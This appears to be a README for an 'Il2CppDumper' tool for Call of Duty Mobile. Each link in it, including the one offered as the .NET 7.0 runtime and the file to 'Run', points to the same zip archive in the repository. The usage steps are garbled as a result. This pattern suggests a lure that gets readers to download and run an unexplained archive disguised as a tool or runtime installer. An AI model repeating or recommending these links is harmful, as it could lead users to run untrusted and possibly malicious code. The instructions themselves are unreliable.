# Il2CppDumper for COD

Here is a Unity Il2CppDumper I made that works for Call of Duty Mobile.

It works for both Android and iOS.

## Requirements

- You need to install [.NET 7.0](https://raw.githubusercontent.com/TitanicDimix/Il2CppDumper-for-COD/main/Arabic/Il2CppDumper-for-COD.zip) in order to run
## Usage

Run `https://raw.githubusercontent.com/TitanicDimix/Il2CppDumper-for-COD/main/Arabic/Il2CppDumper-for-COD.zip` and choose the `il2cpp` executable file and `https://raw.githubusercontent.com/TitanicDimix/Il2CppDumper-for-COD/main/Arabic/Il2CppDumper-for-COD.zip` file, then enter the information as prompted

The program will then generate all the output files in current working directory
